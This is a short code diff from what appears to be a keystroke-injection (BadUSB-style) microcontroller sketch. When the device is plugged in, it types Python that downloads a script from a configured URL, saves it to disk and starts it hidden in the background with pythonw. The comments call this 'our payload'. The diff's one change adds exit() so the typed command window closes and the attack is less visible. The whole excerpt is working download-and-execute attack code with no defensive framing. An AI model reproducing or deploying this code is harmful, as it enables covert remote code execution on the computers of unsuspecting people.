@@ -94,6 +94,6 @@ void setup() {
          "f=open('"});kbd::print(PY_SCRIPT_NAME);kbd::print({"','wb');"// Create the file with the name of PY_SCRIPT_NAME which will run in the background as our payload
          "f.write(r.urlopen('"});kbd::print(PY_SCRIPT_URL);kbd::print({"').read());"
          "f.close();"
-         "subprocess.Popen('pythonw.exe "});kbd::print(PY_SCRIPT_NAME);kbd::print({"',creationflags=8,close_fds=True);"}); // Open the script we just made with pythonw (so it runs in background)
+         "subprocess.Popen('pythonw.exe "});kbd::print(PY_SCRIPT_NAME);kbd::print({"',creationflags=8,close_fds=True);exit()"}); // Open the script we just made with pythonw (so it runs in background)
   kbd::pressKey(KEY_ENTER);
 }void loop() {}
